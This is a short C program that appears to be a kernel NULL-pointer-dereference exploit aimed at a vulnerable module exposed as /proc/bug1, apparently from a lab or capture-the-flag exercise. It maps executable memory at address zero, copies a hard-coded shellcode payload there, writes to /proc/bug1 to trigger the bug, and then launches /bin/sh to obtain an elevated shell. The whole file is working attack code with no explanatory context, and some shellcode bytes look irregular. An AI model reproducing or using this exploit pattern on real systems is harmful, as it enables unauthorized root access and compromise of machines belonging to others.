#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
char payload[] = "\x31\xc0\xe8\xb9\x7f\x6\xc1\xe8\x14\x7e\x6\xc1\xc3";
int main(){
    mmap(0, 4096,PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS ,-1, 0);
    memcpy(0, payload, sizeof(payload));
    int fd = open("/proc/bug1", O_WRONLY);
    write(fd, "muhe", 4);
    system("/bin/sh");
    return 0;
}

